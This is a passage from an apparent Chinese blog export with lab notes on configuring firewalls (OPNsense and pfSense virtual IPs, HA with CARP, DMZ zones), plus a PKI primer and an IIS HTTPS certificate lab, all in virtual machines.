<p>目的：这里对外网的IP是对外发布是为了让外网的人可以访问web服务</p><p>真正企业网络按理说这里的外网IP要购买，但是这里的虚拟实验只要对外映射的IP和外网同一网段就可以了。</p><p>这里把web服务访问IP映射为：100.1.1.88:80</p>        <h3 id="3-2-2-创建虚拟IP">          <a href="#3-2-2-创建虚拟IP" class="heading-link"><i class="fas fa-link"></i></a>3.2.2 创建虚拟IP</h3>      <p>虚拟IP：</p><p>vip-web-server：100.1.1.88</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/3.2.2.1.png"></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/3.2.2.2.png"></p>        <h3 id="3-2-3-写策略">          <a href="#3-2-3-写策略" class="heading-link"><i class="fas fa-link"></i></a>3.2.3 写策略</h3>      <p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/3.2.3.1.png"></p><p>使用outside区域2003（外网PC）通过并访问<span class="exturl"><a class="exturl__link" href="http://100.1.1.88/">http://100.1.1.88</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/3.2.3.2.png"></p><p>win server2008其实也建立了共享文件夹，打开了445端口，但是这里策略写的只允许80端口，所以无法访问共享文件夹。</p>        <h1 id="4-实验四：内容过滤">          <a href="#4-实验四：内容过滤" class="heading-link"><i class="fas fa-link"></i></a>4. 实验四：内容过滤</h1>              <h2 id="4-0-前言">          <a href="#4-0-前言" class="heading-link"><i class="fas fa-link"></i></a>4.0 前言</h2>      <p>在实验1-3的基础上</p>        <h2 id="4-1-将外网2003部署为公网某web服务器及DNS服务器">          <a href="#4-1-将外网2003部署为公网某web服务器及DNS服务器" class="heading-link"><i class="fas fa-link"></i></a>4.1 将外网2003部署为公网某web服务器及DNS服务器</h2>              <h3 id="4-1-1-对于win2003">          <a href="#4-1-1-对于win2003" class="heading-link"><i class="fas fa-link"></i></a>4.1.1 对于win2003</h3>      <p>新建网站good</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/4.1.1.1.png"></p><p>DNS解析</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/4.1.1.2.png"></p><p>部署完成win2003本身访问</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/4.1.1.3.png"></p>        <h3 id="4-1-2-对于win2008和XP">          <a href="#4-1-2-对于win2008和XP" class="heading-link"><i class="fas fa-link"></i></a>4.1.2 对于win2008和XP</h3>      <p>win2008和winXP如果想访问win2008服务器，得配置DNS指向win2003</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/4.1.2.1.png"></p>        <h1 id="5-实验注意">          <a href="#5-实验注意" class="heading-link"><i class="fas fa-link"></i></a>5. 实验注意</h1>      <p>本实验需要防火墙一直打开，总之要先于三台机器；如果实验中存在认为自己配置的策略是正确的，但是三台机器实验时没有得到自己想要的结果的情况，这时可能把PC关闭后重启重新配置可以得到想要的结果。</p><p>总之，策略在前，PC在后；可以把有策略配置完了再配置PC。</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FireWall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>防火墙OPNsense安装</title>
      <link href="2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/"/>
      <url>2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="0-前言">          <a href="#0-前言" class="heading-link"><i class="fas fa-link"></i></a>0. 前言</h2>      <p>下载链接：<span class="exturl"><a class="exturl__link" href="https://opnsense.org/download/">https://opnsense.org/download/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>下载镜像，安装到虚拟机里。</p><a id="more"></a><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/0.0.png"></p>        <h2 id="1-安装">          <a href="#1-安装" class="heading-link"><i class="fas fa-link"></i></a>1. 安装</h2>      <p>配置要求，需要两个网络适配器，一个外网，一个内网（也就是一个局域网，一个广域网）</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/0.1.png"></p><p>启动后，让页面自启，等到有倒计时的页面时，有5秒的倒计时自动检测，这里不要自动检测，直接回车</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.1.png"></p><p>对广域网wan和局域网lan进行命名</p><p>wan：le0</p><p>lan：le1</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.2.png"></p><p>OPNsense 进入了LiveDemo模式，这时如果你用 root 登陆，所有的功能都支持，但所有的存储全部在RAM虚拟盘上！一旦关机或重启，全部配置丢失！如需安装，需用installer登陆（登陆密码都是opnsense）。</p><p>用installer登陆后，将进入安装界面。</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.3.png"></p><p>进入安装界面</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.4.png"></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.5.png"></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.6.png"></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.7.png"></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.8.png"></p><p>下面等待安装，不要cancel</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.9.png"></p><p>两次回车保持原本的默认密码opnsense，然后accept and set password</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.10.png"></p><p>Reboot进行重启</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.11.png"></p><p>重启后进入登录界面，以root/opnsense账户/密码登录</p><p>选项2进行IP 地址修改</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.12.png"></p><p>查看自己设置的网卡的网段le0 口因为使用dhcp直接通过即可，le1口作为lan口，必须使用le1口网卡的网段地址（主机模式下的DHCP分配期间地址）通过查看VMware的虚拟网络编辑器中可以看出是192.168.64.0/24</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.13.png"></p><p>选1 - LAN进行修改局域网IP，也就是本机访问防火墙web端的IP</p><p>然后配置局域网静态IP：192.168.64.131（要在起始和结束IP之间）</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.14.png"></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.15.png"></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.16.png"></p><p>配置完成后重新进入，用修改后的静态IP访问web端，用户/密码：root/opnsense</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99OPNsense%E5%AE%89%E8%A3%85/1.17.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FireWall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>防火墙HA</title>
      <link href="2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/"/>
      <url>2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="0-前言">          <a href="#0-前言" class="heading-link"><i class="fas fa-link"></i></a>0. 前言</h2>      <p>HA(High Available)，高可用性集群，是保证业务连续性的有效解决方案，一般有两个或两个以上的节点，且分为活动节点及备用节点。通常把正在执行业务的称为活动节点，而作为活动节点的一个备份的则称为备用节点。当活动节点出现问题，导致正在运行的业务（任务）不能正常运行时，备用节点此时就会侦测到，并立即接续活动节点来执行业务。从而实现业务的不中断或短暂中断。</p><a id="more"></a><p>只有两个节点的高可用集群又称为双机热备，即使用两台服务器互相备份。当一台服务器出现故障时，可由另一台服务器承担服务任务，从而在不需要人工干预的情况下，自动保证系统能持续对外提供服务。双机热备只是高可用集群的一种，高可用集群系统更可以支持两个以上的节点，提供比双机热备更多、更高级的功能， 更能满足用户不断出现的需求变化。</p><p>通过配置两个防火墙实现有两个出口，一个作为主出口，另一个作为备份，若主损坏了，可以走备份出口。</p><p>HA的主要作用：实现两个防火墙互为备份，实现总出口的高可用性。</p><p>高可用性集群配置的三个要点：</p><ul><li>CARP用于IP地址冗余</li><li>XMLRPC用于配置同步</li><li>pfsync用于状态表同步</li></ul><p>通过配置，两个节点充当“主动/被动”集群，一个节点用作主节点，另一个辅助节点用作备份角色，如果主节点出现故障，辅助节点则根据需要接管。</p>        <h2 id="1-准备">          <a href="#1-准备" class="heading-link"><i class="fas fa-link"></i></a>1. 准备</h2>      <p>两台pfsense防火墙，一台作为主，另一台作为备份；</p><p>一台win XP作为内网PC;</p><p>一台win server2003作为外网PC。</p>        <h2 id="2-配置">          <a href="#2-配置" class="heading-link"><i class="fas fa-link"></i></a>2. 配置</h2>              <h3 id="2-1-两台防火墙接口配置">          <a href="#2-1-两台防火墙接口配置" class="heading-link"><i class="fas fa-link"></i></a>2.1 两台防火墙接口配置</h3>      <p>主(192.168.64.130)：</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/2.1.1.png"></p><p>备份(192.168.64.131)：</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/2.1.2.png"></p>        <h3 id="2-2-防火墙规则设置">          <a href="#2-2-防火墙规则设置" class="heading-link"><i class="fas fa-link"></i></a>2.2 防火墙规则设置</h3>      <p>两台主机通信的同步接口HA的防火墙规则如下（只用配置主防火墙）：</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/2.2.1.png"></p>        <h3 id="2-3-HA同步配置">          <a href="#2-3-HA同步配置" class="heading-link"><i class="fas fa-link"></i></a>2.3 HA同步配置</h3>              <h4 id="2-3-1-主pfsense">          <a href="#2-3-1-主pfsense" class="heading-link"><i class="fas fa-link"></i></a>2.3.1 主pfsense</h4>      <p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/2.3.1.1.png"></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/2.3.1.2.png"></p>        <h4 id="2-3-2-次pfsense">          <a href="#2-3-2-次pfsense" class="heading-link"><i class="fas fa-link"></i></a>2.3.2 次pfsense</h4>      <p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/2.3.2.1.png"></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/2.3.2.2.png"></p>        <h3 id="2-4-CARP设置">          <a href="#2-4-CARP设置" class="heading-link"><i class="fas fa-link"></i></a>2.4 CARP设置</h3>              <h4 id="2-4-1-主pfsense">          <a href="#2-4-1-主pfsense" class="heading-link"><i class="fas fa-link"></i></a>2.4.1 主pfsense</h4>              <h5 id="LAN和WAN接口虚拟IP">          <a href="#LAN和WAN接口虚拟IP" class="heading-link"><i class="fas fa-link"></i></a>LAN和WAN接口虚拟IP</h5>      <p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/2.4.1.1.png"></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/2.4.1.2.png"></p>        <h4 id="2-4-2-次pfsense">          <a href="#2-4-2-次pfsense" class="heading-link"><i class="fas fa-link"></i></a>2.4.2 次pfsense</h4>              <h5 id="LAN和WAN接口虚拟IP-1">          <a href="#LAN和WAN接口虚拟IP-1" class="heading-link"><i class="fas fa-link"></i></a>LAN和WAN接口虚拟IP</h5>      <p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/2.4.2.1.png"></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/2.4.2.2.png"></p>        <h4 id="2-4-3-查看CARP状态">          <a href="#2-4-3-查看CARP状态" class="heading-link"><i class="fas fa-link"></i></a>2.4.3 查看CARP状态</h4>      <p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/2.4.3.1.png"></p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/2.4.3.2.png"></p>        <h3 id="2-5-手动出站NAT配置">          <a href="#2-5-手动出站NAT配置" class="heading-link"><i class="fas fa-link"></i></a>2.5 手动出站NAT配置</h3>      <p>在外网PCwin2003没有配置默认网关时（模拟真实网络），要想内网访问外网，需要配置NAT出站。</p><p>这里只要主pfsense配置就可以了，因为我们一开始就配置了HA同步，所以次pfsense就不需要配置了（如果在后面实验无法成功，次pfsense可以把NAT配置一下，我是不需要的）</p><p>共享的CARP虚拟IP地址作为转发地址（映射地址）</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/2.5.1.png"></p>        <h3 id="2-6-两台PC-IP配置">          <a href="#2-6-两台PC-IP配置" class="heading-link"><i class="fas fa-link"></i></a>2.6 两台PC IP配置</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win XP(内网PC)：</span><br><span class="line">IP地址：192.168.64.135</span><br><span class="line">子网掩码：255.255.255.0</span><br><span class="line">默认网关：192.168.64.200（这个就是我们共享的CARP的lan接口的虚拟IP）</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win server2003（外网）：</span><br><span class="line">IP地址：100.1.1.2</span><br><span class="line">子网掩码：255.255.255.0</span><br><span class="line">默认网关不用配置，模拟真实网络</span><br></pre></td></tr></table></div></figure>        <h3 id="2-7-验证结果">          <a href="#2-7-验证结果" class="heading-link"><i class="fas fa-link"></i></a>2.7 验证结果</h3>      <p>主次pfsense都开启，但是默认情况下在主pfsense没有出现故障时，数据只从主pfsense的接口走，当主pfsense出现故障时，才从次pfsense走。</p><p>内网PC winXP ping通外网PC win server2003，中途把主pfsense关闭；</p><p>实验结果如下：</p><p><img src="/2021/02/06/%E9%98%B2%E7%81%AB%E5%A2%99HA/2.7.1.png"></p>        <h3 id="2-8-参考">          <a href="#2-8-参考" class="heading-link"><i class="fas fa-link"></i></a>2.8 参考</h3>      <p>访问：</p><p><span class="exturl"><a class="exturl__link" href="https://blog.51cto.com/fxn2025/1966556">https://blog.51cto.com/fxn2025/1966556</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><span class="exturl"><a class="exturl__link" href="https://blog.51cto.com/fxn2025/1952978">https://blog.51cto.com/fxn2025/1952978</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FireWall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PKI技术</title>
      <link href="2021/02/06/PKI/"/>
      <url>2021/02/06/PKI/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-PKI概述">          <a href="#1-PKI概述" class="heading-link"><i class="fas fa-link"></i></a>1. PKI概述</h2>      <p>名称：Public Key Infra…公钥基础设施<br>作用：通过加密技术和数字签名保证信息的安全<br>组成：公钥加密技术、数字证书、CA、RA</p><a id="more"></a>        <h2 id="2-信息安全三要素">          <a href="#2-信息安全三要素" class="heading-link"><i class="fas fa-link"></i></a>2. 信息安全三要素</h2>      <p>机密性<br>完整性<br>身份验证/操作的不可否认性</p>        <h2 id="3-哪些IT领域用到PKI：">          <a href="#3-哪些IT领域用到PKI：" class="heading-link"><i class="fas fa-link"></i></a>3. 哪些IT领域用到PKI：</h2>      <p>1）SSL/HTTPS<br>2）IPsecVPN<br>3）部分远程访问VPN</p>        <h2 id="4-公钥加密技术">          <a href="#4-公钥加密技术" class="heading-link"><i class="fas fa-link"></i></a>4. 公钥加密技术</h2>      <p>作用：实现对信息加密、数字签名等安全保障<br>加密算法：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1）对称加密算法</span><br><span class="line">加解密的密钥一致！</span><br><span class="line">DES  3DES  AES</span><br></pre></td></tr></table></div></figure><pre><code>2）非对称加密算法通信双方各自产生一对公私钥。双方各自交换公钥公钥和私钥为互相加解密关系！公私钥不可互相逆推！RSA  DH</code></pre><p>x+5=y(对称加密算法）<br>x是原数据/原文<br>y是密文<br>5是key/密钥</p><p>HASH算法：MD5  SHA （验证完整性）<br>HASH值可逆么？不可逆！<br>HASH值=摘要</p><p>数字签名：<br>用自己的私钥对摘要加密得出的密文就是数字签名</p>        <h2 id="5-证书：">          <a href="#5-证书：" class="heading-link"><i class="fas fa-link"></i></a>5. 证书：</h2>      <p>证书用于保证公密的合法性<br>证书格式遵循X.509标准<br>数字证书包含信息：<br> 使用者的公钥值<br> 使用者标识信息（如名称和电子邮件地址）<br> 有效期（证书的有效时间）<br> 颁发者标识信息<br> 颁发者的数字签名<br>数字证书由权威公正的第三方机构即CA签发</p><p>CA是权威证书颁发机构，为了公正“公钥”的合法性！<br>机密性：使用对方的公钥加密！<br>身份验证/数字签名：使用自己的私钥！</p>        <h2 id="6-实验名称：部署HTTPS服务器-部署SSL服务器">          <a href="#6-实验名称：部署HTTPS服务器-部署SSL服务器" class="heading-link"><i class="fas fa-link"></i></a>6. 实验名称：部署HTTPS服务器/部署SSL服务器</h2>      <p>实验环境：<br>1）win2008作为https服务器：10.1.1.1/24<br>2）win7作为客户机：10.1.1.2/24<br>3）桥接到虚拟网络vmenet1</p><p>实验步骤：</p><ol><li><p>配置服务器IP地址10.1.1.1/24。</p></li><li><p>安装IIS服务 并建立一个站点,角色服务使用了“应用程序开发”(意味着可以发布动态网站)。</p><p>  (必须使用域名)并配置DNS服务器，并初步验证访问<span class="exturl"><a class="exturl__link" href="http://www.haoye.com一下./">http://www.haoye.com一下。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></li><li><p>安装CA组件(active活动目录证书)-&gt;角色服务(证书颁发机构/web注册)</p></li><li><p>打开IIS，服务器证书申请(通用名称：<span class="exturl"><a class="exturl__link" href="http://www.haoye.com,申请文件为服务器公钥/">www.haoye.com，申请文件为服务器公钥</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>)</p></li><li><p>向CA申请证书：<br>  打开网页<span class="exturl"><a class="exturl__link" href="http://10.1.1.1/certsrv%E5%B9%B6%E4%BD%BF%E7%94%A8base64%E7%BC%96%E7%A0%81(%E9%80%89%E9%AB%98%E7%BA%A7%E8%AF%81%E4%B9%A6%E7%94%B3%E8%AF%B7%EF%BC%8C%E6%98%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%94%B3%E8%AF%B7%E7%9A%84%EF%BC%9Bweb%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AF%81%E4%B9%A6%E6%98%AF%E5%91%98%E5%B7%A5%E7%94%B3%E8%AF%B7%EF%BC%8C%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E5%8F%8C%E5%90%91%E9%AA%8C%E8%AF%81%EF%BC%8C%E8%AF%81%E6%98%8E%E5%91%98%E5%B7%A5%E6%98%AF%E8%87%AA%E5%B7%B1%E5%85%AC%E5%8F%B8%E7%9A%84)">http://10.1.1.1/certsrv并使用base64编码(选高级证书申请，是服务器申请的；web浏览器证书是员工申请，这是一个双向验证，证明员工是自己公司的)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></li><li><p>CA(挂起的证书中)颁发证书</p></li><li><p>在web服务器(查看挂起的证书申请状态)上下载并完成安装</p></li><li><p>在IIS的web服务器中找到服务器证书完成证书申请</p></li><li><p>IIS中对网站king编辑绑定，添加https，导入证书</p></li><li><p>对king网站的SSL设置，要求SSL意味着只能用443端口访问，不能用80端口访问，最后要在右边“应用”</p></li><li><p>这时候win7访问网页显示不是信任的，win7通过浏览器导入公钥证书证书；访问<span class="exturl"><a class="exturl__link" href="http://10.1.1.1/certsrv%E4%B8%8B%E8%BD%BDCA%E8%AF%81%E4%B9%A6%EF%BC%8CInternet%E9%80%89%E9%A1%B9%E4%B8%AD%E5%AF%BC%E5%85%A5%EF%BC%8C%E5%AD%98%E5%82%A8%E4%B8%BA%E2%80%9C&quot;%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%9A%84%E8%AF%81%E4%B9%A6%E9%A2%81%E5%8F%91%E6%9C%BA%E6%9E%84&quot;">http://10.1.1.1/certsrv下载CA证书，Internet选项中导入，存储为“&quot;受信任的证书颁发机构&quot;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PKI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OPNsense的DMZ区配置</title>
      <link href="2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/"/>
      <url>2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="0-前言">          <a href="#0-前言" class="heading-link"><i class="fas fa-link"></i></a>0. 前言</h2>              <h3 id="0-1-介绍">          <a href="#0-1-介绍" class="heading-link"><i class="fas fa-link"></i></a>0.1 介绍</h3>      <p>DMZ是非军事区的缩写，是一种网络（物理或逻辑），用于连接主机，这些主机提供与不受信任的外部网络（通常是Internet）的接口，同时保持内部，专用网络（通常是公司网络）分离和隔离形成外部网络。</p><a id="more"></a><p>由于最容易受到攻击的系统是为局域网之外的用户提供服务的系统，例如电子邮件，Web和域名系统（DNS）服务器，因此它们在DMZ内部被“隔离”，从那里对专用网络的访问受到限制。DMZ中的主机可以与内部和外部网络进行通信，但是与内部网络主机的通信受到严格限制。</p><p>使用安全网关（即防火墙）隔离DMZ，以过滤DMZ和专用网络之间的流量。DMZ本身前面还有一个安全网关，用于过滤来自外部网络的传入流量。</p><p>DMZ的最终目标是允许从不受信任的网络访问资源，同时保持私有网络的安全。DMZ中通常放置的资源包括Web服务器，邮件服务器，FTP服务器和VoIP服务器。</p>        <h3 id="0-2-DMZ的好处">          <a href="#0-2-DMZ的好处" class="heading-link"><i class="fas fa-link"></i></a>0.2 DMZ的好处</h3>      <p>DMZ是不安全的网络，它允许从不受信任的外部网络访问其上的主机/系统，同时使专用网络上的其他主机/系统与外部网络隔离并保护其安全。</p><p>DMZ的目的是允许从外部不受信任的网络（即Internet）访问某些主机/系统，同时将网络的其余部分（专用网络）保护在防火墙之后。</p><p>通过配置一定的规则策略可以把DMZ区域当作中转站，很大程度上降低了安全问题。</p>        <h3 id="0-3-其他">          <a href="#0-3-其他" class="heading-link"><i class="fas fa-link"></i></a>0.3 其他</h3>      <p>对于当下比较流行的思科防火墙或者是天融信防火墙来说，它们都有自带的DMZ区域；而作为开源防火墙的opnsense没有自带的DMZ区域，所以不少人在第一次使用这个开源的防火墙会遇到不少困难，DMZ无法轻松地配置，所以我写这篇文章来记录，防止其他人入坑，避免不必要的绕弯子。</p>        <h2 id="1-实验要求">          <a href="#1-实验要求" class="heading-link"><i class="fas fa-link"></i></a>1. 实验要求</h2>              <h3 id="1-0-建立三个不同网络">          <a href="#1-0-建立三个不同网络" class="heading-link"><i class="fas fa-link"></i></a>1.0 建立三个不同网络</h3>      <p>不同网络作为不同区域</p><p>内网区域：192.168.64.0/24</p><p>外网区域：100.1.1.0/24</p><p>停火区域：172.16.1.0/24</p>        <h3 id="1-1-网络拓扑图">          <a href="#1-1-网络拓扑图" class="heading-link"><i class="fas fa-link"></i></a>1.1 网络拓扑图</h3>      <p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/1.1.png"></p>        <h3 id="1-2-实验所需设备">          <a href="#1-2-实验所需设备" class="heading-link"><i class="fas fa-link"></i></a>1.2 实验所需设备</h3>      <p>一台win XP作为内网PC；一台win server 2003作为外网服务器；一台win server 2008作为停火区服务器；这三台机器在虚拟机VMware上进行操作。</p>        <h3 id="1-3-要求实现的结果">          <a href="#1-3-要求实现的结果" class="heading-link"><i class="fas fa-link"></i></a>1.3 要求实现的结果</h3>      <p>内网区域任何主机可以访问外网，同时可以访问dmz区域；</p><p>dmz区域主机可以访问外网，但不可以访问内网；</p><p>外网不可以访问内网，同时外网也不可以访问dmz区域。</p>        <h2 id="2-实验过程">          <a href="#2-实验过程" class="heading-link"><i class="fas fa-link"></i></a>2. 实验过程</h2>              <h3 id="2-0-opnsense网络适配器配置">          <a href="#2-0-opnsense网络适配器配置" class="heading-link"><i class="fas fa-link"></i></a>2.0 opnsense网络适配器配置</h3>      <p>由于防火墙需要连接三方，所以我们需要三个接口，在虚拟机中就需要配置三个网络适配器，一个作为lan(内网)，一个作为wan(外网)，一个作为dmz(停火区)；同时，需要把三个网络适配器分配在不同的虚拟网络中。</p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.0.png"></p>        <h3 id="2-1-三台机器网络适配器配置">          <a href="#2-1-三台机器网络适配器配置" class="heading-link"><i class="fas fa-link"></i></a>2.1 三台机器网络适配器配置</h3>      <p>另外三台机器需要分别和opnsense的三个网络适配器配在同一个虚拟网络中；</p><p>win XP 放在VM1中；win server2003放在VM0中；win server2008放在VM2中。</p>        <h3 id="2-1-DMZ接口创建">          <a href="#2-1-DMZ接口创建" class="heading-link"><i class="fas fa-link"></i></a>2.1 DMZ接口创建</h3>      <p>访问opnsense的web网页端，在左侧找到“接口”–&gt;”分配“–&gt;添加</p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.1.1.png"></p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.1.2.png"></p>        <h3 id="2-2-接口配置">          <a href="#2-2-接口配置" class="heading-link"><i class="fas fa-link"></i></a>2.2 接口配置</h3>              <h4 id="2-2-1-lan接口配置">          <a href="#2-2-1-lan接口配置" class="heading-link"><i class="fas fa-link"></i></a>2.2.1 lan接口配置</h4>      <p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.2.1.png"></p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.2.2.png"></p><p>“保存”后右上角“应用更改”（切莫忘记）</p>        <h4 id="2-2-2-wan接口配置">          <a href="#2-2-2-wan接口配置" class="heading-link"><i class="fas fa-link"></i></a>2.2.2 wan接口配置</h4>      <p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.3.1.png"></p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.3.2.png"></p><p>“保存”后右上角“应用更改”（切莫忘记）</p>        <h4 id="2-2-3-dmz接口配置">          <a href="#2-2-3-dmz接口配置" class="heading-link"><i class="fas fa-link"></i></a>2.2.3 dmz接口配置</h4>      <p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.4.1.png"></p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.4.2.png"></p><p>“保存”后右上角“应用更改”（切莫忘记）</p>        <h3 id="2-5-三台机器IP以及默认网关配置">          <a href="#2-5-三台机器IP以及默认网关配置" class="heading-link"><i class="fas 